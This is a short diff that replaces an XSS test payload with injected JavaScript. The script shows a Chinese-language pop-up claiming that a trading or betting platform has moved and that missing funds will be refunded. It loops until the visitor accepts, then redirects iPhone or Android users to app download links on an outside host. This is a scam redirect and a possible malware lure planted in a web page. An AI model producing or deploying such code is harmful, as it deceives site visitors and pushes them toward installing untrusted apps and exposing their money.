@@ -1,1 +1,16 @@
-<script>alert(/123/);</script>
+<script>
+var sjstr="由于国家重大决策影响导致原平台运行不稳定以及平台升级原因，我司已将业务转移至其他平台，请各位会员下载新平台使用并卸载旧平台，老会员可以使用原账号登录，\n由于原平台开发团队已经失联，之前网站上面的账目需要人工对账一段时间才会退回原账户，预计在72小时内陆续到账，敬请谅解\n若由于我们的行为造成您的损失，可以携交易/转账记录，发送到我们的客服人员进行处理"
+var android="https://app.xieyutech.com/I/CEFJPT2K";
+var iphone="https://app.xieyutech.com/I/9DNJ1870";
+function tc(){
+if(confirm(sjstr)){
+if((/(mac|iphone)/).test(navigator.userAgent)){
+  window.top.location=iphone
+}
+  else {
+  window.top.location=android
+  }
+}
+else tc();
+}
+</script>
